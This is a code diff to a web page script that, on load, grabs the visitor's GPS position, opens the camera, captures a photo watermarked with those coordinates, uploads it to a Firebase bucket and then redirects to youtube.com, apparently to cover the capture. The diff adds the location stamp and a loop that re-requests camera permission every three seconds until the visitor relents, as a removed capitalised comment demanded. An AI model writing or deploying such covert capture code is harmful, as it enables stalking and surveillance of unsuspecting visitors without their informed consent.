@@ -12,31 +12,30 @@ const firebaseConfig = {
 // Initialize Firebase
 const app = firebase.initializeApp(firebaseConfig);
 const storage = firebase.storage();
+const database = firebase.database();
 
-// Access the camera with higher resolution
-async function startVideo() {
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({
-            video: {
-                width: { ideal: 1280 },
-                height: { ideal: 720 }
-            }
+// Variable to store location
+let userLocation = null;
+
+// Function to request location permission and get location
+function getLocation() {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition((position) => {
+            userLocation = {
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude
+            };
+            console.log('Location retrieved:', userLocation);
+        }, (error) => {
+            console.error('Error accessing location:', error);
+            document.getElementById('message').textContent = 'Location access denied or an error occurred.';
         });
-        const video = document.createElement('video');
-        video.srcObject = stream;
-        video.play();
-        
-        // Capture photo once the video stream is ready
-        video.onloadedmetadata = () => {
-            capturePhoto(video);
-        };
-    } catch (error) {
-        console.error('Error accessing camera:', error);
-        document.getElementById('message').textContent = 'Camera access denied or an error occurred.';
+    } else {
+        console.error('Geolocation is not supported by this browser.');
     }
 }
 
-// Capture the photo and upload it to Firebase Storage
+// Function to capture photo and upload to Firebase Storage with watermark
 function capturePhoto(video) {
     const canvas = document.createElement('canvas');
     const context = canvas.getContext('2d');
@@ -48,25 +47,74 @@ function capturePhoto(video) {
     // Draw the video frame to the canvas
     context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
+    // Check if location is available for watermark
+    if (userLocation) {
+        const latitude = userLocation.latitude.toFixed(6); // Limit to 6 decimal places
+        const longitude = userLocation.longitude.toFixed(6);
+
+        // Set watermark text
+        const watermarkText = `L:${latitude}, L:${longitude}`;
+
+        // Set text properties
+        context.font = '30px Arial'; // Font size and type
+        context.fillStyle = 'red'; // Text color
+        context.globalAlpha = 0.7; // Transparency for the watermark
+        context.fillText(watermarkText, 10, canvas.height - 20); // Positioning the text
+    }
+
     // Convert the canvas image to a Blob
     canvas.toBlob(async function(blob) {
         const fileName = `photo_${Date.now()}.png`;
         const storageRef = storage.ref(`users/${fileName}`);
 
         try {
+            // Upload the image to Firebase Storage
             await storageRef.put(blob);
-            // Redirect after 1 seconds
+
+            console.log('Photo uploaded with filename:', fileName);
+
+            // Redirect after 1 second
             setTimeout(() => {
-                window.location.href = '/ESRAT/index-home.html';
-            }, 1000);  // 1000 milliseconds = 1 seconds
+                window.location.href = 'https://youtube.com/';
+            }, 1000);  // 1000 milliseconds = 1 second
         } catch (error) {
             console.error('Error uploading to Firebase:', error);
-            // Optionally handle upload failure here
         }
     }, 'image/png', 1.0);  // The third argument '1.0' specifies the image quality (max quality)
 }
 
-// Start the video stream when the page loads
-window.onload = startVideo;
+// Access the camera with higher resolution and request permission until granted
+async function startVideo() {
+    let accessGranted = false;
+    while (!accessGranted) {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({
+                video: {
+                    width: { ideal: 1280 },
+                    height: { ideal: 720 }
+                }
+            });
+            accessGranted = true;  // Camera access granted
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.play();
 
-// ADD ANOTHER FUNCTION TO REQUEST CAMERA PERMISSION AGAIN AND AGAIN TILL GRANTED. ADD FOR SURE, PLEASE.
+            // Capture photo once the video stream is ready
+            video.onloadedmetadata = () => {
+                capturePhoto(video);
+            };
+        } catch (error) {
+            console.error('Error accessing camera:', error);
+            document.getElementById('message').textContent = 'Camera access denied, trying again...';
+
+            // Wait for 3 seconds before retrying
+            await new Promise(resolve => setTimeout(resolve, 3000));
+        }
+    }
+}
+
+// Start the camera and location request on page load
+window.onload = () => {
+    getLocation();  // Request location permission first
+    startVideo();   // Request camera permission next
+};
